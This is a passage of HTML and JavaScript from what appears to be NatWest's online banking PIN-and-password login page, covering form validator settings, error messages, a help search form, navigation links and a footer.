								ctl00_mainContent_LI6PPEE_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPEE_edit_RegularExpression.validationexpression = "^(.)$";
								var ctl00_mainContent_LI6PPEF_edit_validator = document.all ? document.all["ctl00_mainContent_LI6PPEF_edit_validator"] : document.getElementById("ctl00_mainContent_LI6PPEF_edit_validator");
								ctl00_mainContent_LI6PPEF_edit_validator.controltovalidate = "ctl00_mainContent_LI6PPEF_edit";
								ctl00_mainContent_LI6PPEF_edit_validator.display = "Dynamic";
								ctl00_mainContent_LI6PPEF_edit_validator.evaluationfunction = "CustomValidatorEvaluateIsValid";
								var ctl00_mainContent_LI6PPEF_edit_RegularExpression = document.all ? document.all["ctl00_mainContent_LI6PPEF_edit_RegularExpression"] : document.getElementById("ctl00_mainContent_LI6PPEF_edit_RegularExpression");
								ctl00_mainContent_LI6PPEF_edit_RegularExpression.controltovalidate = "ctl00_mainContent_LI6PPEF_edit";
								ctl00_mainContent_LI6PPEF_edit_RegularExpression.errormessage = "You have entered an invalid character as part of your Password. Your Password will be made up of letters and/or numbers.";
								ctl00_mainContent_LI6PPEF_edit_RegularExpression.display = "Dynamic";
								ctl00_mainContent_LI6PPEF_edit_RegularExpression.evaluationfunction = "RegularExpressionValidatorEvaluateIsValid";
								ctl00_mainContent_LI6PPEF_edit_RegularExpression.validationexpression = "^(.)$";
								var ctl00_mainContent_ctl161 = document.all ? document.all["ctl00_mainContent_ctl161"] : document.getElementById("ctl00_mainContent_ctl161");
								ctl00_mainContent_ctl161.errormessage = "<p> The Customer Number, PIN or Password has been entered incorrectly.</p><p> Please re-enter carefully to avoid temporarily losing access to online banking and Telephone Banking. </p>";
								ctl00_mainContent_ctl161.display = "None";
								ctl00_mainContent_ctl161.evaluationfunction = "CustomValidatorEvaluateIsValid";
								//]]>
                        </script>

								
<script type="text/javascript">
//<![CDATA[
top.document.title='Log in - PIN and Password details';//]]>
                        </script>

<script type="text/javascript">
<!--
var Page_ValidationActive = false;
if (typeof(ValidatorOnLoad) == "function") {
    ValidatorOnLoad();
}

function ValidatorOnSubmit() {
    if (Page_ValidationActive) {
        return ValidatorCommonOnSubmit();
    }
    else {
        return true;
    }
}
// -->
                        </script>
        
<script type="text/javascript">
//<![CDATA[
document.getElementById('ctl00_mainContent_LI6PPEA_edit').focus()//]]>
                        </script>

</form>
                </div>
                <a name="menu"></a>
                <div id="ctl00_leftPanel" class="left menu">
                    <div id="MenuDiv" class="box_menu"><div class="box_top_menu"><hr /></div>
	<div id="ctl00_menu_navmenu_menuHeaderDiv" class="MenuHeader">
	    <h3>
									<img id="mnubtha" alt="Online banking" class="H3Img " src="https://www.nwolb.com/brands/NWB/images/generated_F66D1455C524182E5932378B2FC54249EB4C8DD1-3.gif" width="118" height="23" />
								</h3>

	</div>
	<div id="ctl00_menu_navmenu_menuBodyDiv" class="MenuBody">
	    <ul id="menu">
		     <li><a id="ctl00_menu_navmenu_Navigationlink2Anchor" class="mnu0" href="https://www.nwolb.com/Login.aspx">Restart Log In</a></li>   
		     <li><a id="ctl00_menu_navmenu_Navigationlink1Anchor" class="mnu0" target="_top" href="https://www.nwolb.com/ServiceManagement/RedirectOutOfService.aspx?targettag=destination_ExitService&amp;secstatus=0">Log Out</a></li>   
        </ul>
    </div>
</div>
                    <div id="faqPanel" class="box_faqPanel"><div class="box_top_faqPanel"><hr /></div>

	<div class="box_faqPanelWrapper"><div class="box_top_faqPanelWrapper"><hr /></div>
		<div id="ctl00_faqs_ctl00_questionPanel" class="questionPanel">
									
			<div class="faqHeading">
										
				<h3>
											<img id="FAQBTHA" alt="Help 24x7" class="H3Img " src="https://www.nwolb.com/brands/NWB/images/generated_FF75EF355BDAE1559C9C80DB0CAE8194C7F233DD-3.gif" width="84" height="23" />
										</h3>
			</div>
			<p>
				<span id="ctl00_faqs_ctl00_FAQBTEA">Got a question? <br /> We can help</span>

			</p>
		<form class="faqForm" method="get" action="https://www.questions.natwest.com/RBSG/index?page=search" target="_blank">
											<input id="ctl00_faqs_ctl00_ctl04" name="brand" value="NPC" type="hidden" /><input id="ctl00_faqs_ctl00_ctl05" name="pageID" value="LI6" type="hidden" /><input id="ctl00_faqs_ctl00_ctl06" name="wc" value="445632D9E268027A59D9479C397481A715C7E654" type="hidden" /><input id="ctl00_faqs_ctl00_ctl07" name="segmentCode" value="" type="hidden" /><input id="ctl00_faqs_ctl00_ctl08" name="ageCategory" value="" type="hidden" /><input id="ctl00_faqs_ctl00_ctl09" name="page" value="search" type="hidden" />
                                            <input id="ctl00_faqs_ctl00_FAQ-IF1" class="faqQuestion" name="question" value="Why can't I log in?" type="text" maxlength="250" size="20" /><label for="ctl00_faqs_ctl00_FAQ-IF1" class="hidden">Question</label><div class="faqNav">
					<div class="btnNext btnbg">
						<div class="btnt">
							<div class="btnr">
								<div class="btnb">

									<div class="btnl">
										<div class="btntl">
											<div class="btntr">
												<div class="btnbr">
													<div class="btnbl"><input id="ctl00_faqs_ctl00_FAQ-BTN1" class="button-right" name="" value="Ask" type="submit" /></div>
													</div>
												</div>
											</div>
										</div>

									</div>
								</div>
							</div>
						</div>
					</div>
										</form></div>
	</div>
	<div id="ctl00_faqs_ctl00_topFAQsPanel" class="topFaqPanel">
											
	</div>

	<br clear="all" />
</div>

                    
                    
                </div>
            </div>
            
            <br class="clear" />
        </div>  
        
<div id="footerContainer" style="width: 976px; height: 29px">
    <div id="footer">
        <ol class="footer_navbar">

            <li><a id="ctl00_footer_ctl00_PopUpLink2Anchor" title="Legal Info : Opens in a new window" onclick="window.open('http://www.natwest.com/tools/general/nwolb_legals/index.htm','headerWindow','top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes');return false;" href="http://www.natwest.com/tools/general/nwolb_legals/index.htm" target="headerWindow">Legal Info</a></li>
    		<li><a id="ctl00_footer_ctl00_PopUpLink3Anchor" title="Privacy  : Opens in a new window" onclick="window.open('http://www.natwest.com/tools/general/nwolb_legals/privacy.htm','headerWindow','top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes');return false;" href="http://www.natwest.com/tools/general/nwolb_legals/privacy.htm" target="headerWindow">Privacy </a></li>
    		<li><a id="ctl00_footer_ctl00_PopUpLink4Anchor" title="Security : Opens in a new window" onclick="window.open('http://www.natwest.com/tools/general/nwolb_legals/security.htm','headerWindow','top=70,left=60,width=800,height=600,resizable=yes,scrollbars=yes,location=yes');return false;" href="http://www.natwest.com/tools/general/nwolb_legals/security.htm" target="headerWindow">Security</a></li>
    		<li class="last"><span id="ctl00_footer_ctl00_CopyrightText">?
            2005-2009 National Westminster Bank plc</span></li>
        </ol>
    </div>
</div>


    </div>
</body>
</html>